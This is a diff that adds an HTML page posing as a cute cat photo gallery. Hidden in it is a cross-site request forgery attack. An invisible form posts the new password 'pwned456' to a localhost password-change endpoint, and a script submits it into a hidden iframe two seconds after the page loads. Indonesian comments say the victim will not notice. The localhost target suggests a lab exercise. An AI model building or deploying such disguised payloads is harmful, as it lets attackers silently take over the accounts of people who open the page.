@@ -1,0 +1,60 @@
+!DOCTYPE html>
+<html>
+<head>
+    <title>Cute Cat Photos 🐱</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            max-width: 1200px;
+            margin: 30px auto;
+        }
+        .gallery img {
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <h1>🐱 Cute Cat Photos Gallery 🐱</h1>
+    <p>Check out these adorable cats!</p>
+    
+    <div class="gallery">
+        <img src="https://placekitten.com/400/300" alt="Cute cat 1">
+        <img src="https://placekitten.com/400/301" alt="Cute cat 2">
+        <img src="https://placekitten.com/401/300" alt="Cute cat 3">
+        <img src="https://placekitten.com/402/300" alt="Cute cat 4">
+        <img src="https://placekitten.com/400/302" alt="Cute cat 5">
+        <img src="https://placekitten.com/403/300" alt="Cute cat 6">
+    </div>
+    
+    <!-- Hidden iframe untuk CSRF attack -->
+    <iframe style="display:none;" name="csrf_frame"></iframe>
+    
+    <!-- Hidden form yang akan di-submit ke iframe -->
+    <form id="csrf_form" action="http://localhost:8000/csrf.php" method="POST" target="csrf_frame" style="display:none;">
+        <input type="hidden" name="new_password" value="pwned456">
+        <input type="hidden" name="confirm_password" value="pwned456">
+    </form>
+    
+    <script>
+        // Submit form ke hidden iframe setelah 2 detik
+        // User tidak akan notice karena submit ke iframe yang hidden
+        setTimeout(function() {
+            document.getElementById('csrf_form').submit();
+            console.log('CSRF attack executed silently...');
+        }, 2000);
+    </script>
+</body>
+</html>
